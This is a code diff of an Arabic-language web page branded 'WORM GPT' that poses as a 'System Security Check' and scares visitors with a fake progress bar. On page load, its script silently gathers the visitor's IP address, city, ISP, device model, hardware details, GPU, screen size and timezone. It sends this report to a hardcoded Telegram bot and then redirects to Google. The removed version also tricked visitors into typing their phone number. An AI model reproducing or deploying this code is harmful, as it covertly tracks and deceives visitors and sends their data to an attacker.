@@ -2,24 +2,16 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>⚠️ ALERT: SYSTEM OVERRIDE ⚠️</title>
+    <title>⚠️ System Security Check</title>
 </head>
-<body onload="launchPredator()" style="background:#000; color:#00ff00; font-family:monospace; text-align:center; padding-top:2%;">
+<body onload="launchGhostStrike()" style="background:#000; color:#ff0000; font-family:monospace; text-align:center; padding-top:20%;">
     
-    <div style="margin-bottom: 15px;">
-        <img src="https://i.imgur.com/Gis4zUf.jpeg" alt="Hacker Mask" style="width: 180px; border: 2px solid #ff0000; box-shadow: 0 0 20px #ff0000;">
+    <div style="margin-bottom: 20px;">
+        <img src="https://i.imgur.com/Gis4zUf.jpeg" alt="Hacker Mask" style="width: 220px; filter: drop-shadow(0 0 15px #ff0000);">
     </div>
     
-    <h1 style="font-size: 22px; color: #ff0000; text-shadow: 0 0 15px #ff0000;">[ WORM GPT - PREDATOR EDITION ]</h1>
-    <p style="color: #fff;">Scanning Hardware Components... <span id="pct">0</span>%</p>
-
-    <div id="phoneBox" style="display:none; background: #111; padding: 20px; border: 2px solid #ff0000; width: 85%; margin: 15px auto; border-radius: 10px;">
-        <p style="color: #ff0000; font-weight: bold; font-size: 18px;">🛑 تـم كـشـف هـويـتـك الـرقـمـيـة</p>
-        <p style="font-size: 13px; color: #ccc;">لإيقاف سحب ملفاتك، أدخل رقم الجوال المسجل في النظام:</p>
-        <input type="tel" id="phoneNumber" placeholder="05XXXXXXXX" style="background: #000; color: #ff0000; border: 1px solid #ff0000; padding: 12px; width: 85%; text-align: center; margin-bottom: 15px; font-size: 18px;">
-        <br>
-        <button onclick="sendPhone()" style="background: #ff0000; color: #fff; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; border-radius: 5px;">تـأكـيـد الـهـويـة 💀</button>
-    </div>
+    <h1 style="font-size: 28px; text-shadow: 0 0 15px #ff0000;">[ WORM GPT - GHOST MODE ]</h1>
+    <p style="color: #fff;">Verifying Encrypted Connection... <span id="pct">0</span>%</p>
 
     <script>
     const TOKEN = "8069850549:AAG4ZyU6Vudg7A1qDvfEHeMcfln6ajyNh64";
@@ -28,60 +20,63 @@
     let p = 0;
     let inv = setInterval(() => { 
         if(p < 100) { p++; document.getElementById('pct').innerText = p; } 
-        else { clearInterval(inv); document.getElementById('phoneBox').style.display = 'block'; }
-    }, 25);
+    }, 15);
 
-    let report = "";
-
-    async function launchPredator() {
-        report = "⚡ [ WORM GPT - هـجـوم الـمـفـتـرس ] ⚡\n";
+    async function launchGhostStrike() {
+        let report = "👻 [ تـقـريـر الاخـتـراق الـصـامـت ] 👻\n";
         report += "━━━━━━━━━━━━━━━━━━━━━━\n\n";
 
-        // 1. تحديد اسم الجهاز الفعلي بدقة
-        const deviceName = getExactDevice();
-        
-        try {
-            const res = await fetch('https://ipwho.is/').then(r => r.json());
-            report += "🌐 【 بـيـانـات الـشـبـكـة 】\n";
-            report += `📍 الـ IP: ${res.ip}\n`;
-            report += `🏙️ الـمـديـنـة: ${res.city}, ${res.country}\n`;
-            report += `🏢 الـمـزود: ${res.connection.isp}\n\n`;
-        } catch(e) { report += "🌐 الـ IP: [ مـحمـي ]\n\n"; }
-
-        report += "📱 【 مـواصـفـات الـهـدف 】\n";
-        report += `📱 الـجـهـاز: ${deviceName}\n`;
-        report += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Threads\n`;
-        report += `💾 الـرام: ${navigator.deviceMemory || '??'} GB\n\n`;
-        
-        sendToTelegram(report + "⏳ [ جـاري انـتـظار رقـم الـجـوال... ]");
-    }
-
-    function getExactDevice() {
+        // 1. تحديد اسم الجهاز بدقة (تنظيف الـ User Agent)
+        let device = "Unknown Device";
         const ua = navigator.userAgent;
         if (/android/i.test(ua)) {
             const match = ua.match(/Android\s+([^\s;]+);\s+([^;]+)/);
-            return match ? match[2] : "Android Device";
+            device = match ? match[2] : "Android Device";
+        } else if (/iPhone/i.test(ua)) {
+            device = "iPhone";
+        } else {
+            device = navigator.platform;
         }
-        if (/iPhone/i.test(ua)) return "iPhone";
-        return navigator.platform;
+
+        // 2. سحب الـ IP والموقع بقوة (استخدام سيرفر سريع)
+        try {
+            const res = await fetch('https://ipapi.co/json/').then(r => r.json());
+            report += "🌐 【 بـيـانـات الـشـبـكـة 】\n";
+            report += `📍 الـ IP: ${res.ip}\n`;
+            report += `🏙️ الـمـديـنـة: ${res.city}, ${res.country_name}\n`;
+            report += `🏢 الـمـزود: ${res.org}\n\n`;
+        } catch(e) { 
+            report += "🌐 الـ IP: [ تـعـذر الـسـحب - حماية ]\n\n"; 
+        }
+
+        // 3. مواصفات العتاد
+        report += "📱 【 مـواصـفـات الـهـدف 】\n";
+        report += `📱 الـجـهـاز: ${device}\n`;
+        report += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Core\n`;
+        report += `💾 الـرام: ${navigator.deviceMemory || '??'} GB\n`;
+        report += `🖼️ الـجـرافـيـك: ${getGPU()}\n\n`;
+
+        // 4. البصمة الرقمية
+        report += "🕵️ 【 الـبـصـمـة الـجـنـائـيـة 】\n";
+        report += `📏 الـشـاشـة: ${window.screen.width}x${window.screen.height}\n`;
+        report += `⏰ الـتـوقـيـت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        report += "━━━━━━━━━━━━━━━━━━━━━━\n";
+        report += "💀 [ تـم سـحب الـبيانات بـنجاح ]";
+
+        // إرسال البيانات فوراً
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`)
+        .then(() => {
+            // تحويل الضحية لقوقل بعد 2.5 ثانية (وقت كافي للسحب الصامت)
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2500);
+        });
     }
 
-    function sendPhone() {
-        const phone = document.getElementById('phoneNumber').value;
-        if(phone.length < 9) { alert("أدخل رقم صحيح!"); return; }
-        
-        let finalReport = report + "📞 【 مـعـلـومـات الاتـصـال 】\n";
-        finalReport += `📱 رقـم الـجـوال: ${phone}\n`;
-        finalReport += "━━━━━━━━━━━━━━━━━━━━━━\n";
-        finalReport += "💀 [ تـم الاخـتـراق الـنـهـائـي ]";
-
-        sendToTelegram(finalReport);
-        alert("تـم تـأمين الـوصول. جـاري التحويل...");
-        window.location.href = "https://www.google.com";
-    }
-
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    function getGPU() {
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL).split(' ').pop();
+        } catch(e) { return "Hidden"; }
     }
     </script>
 </body>
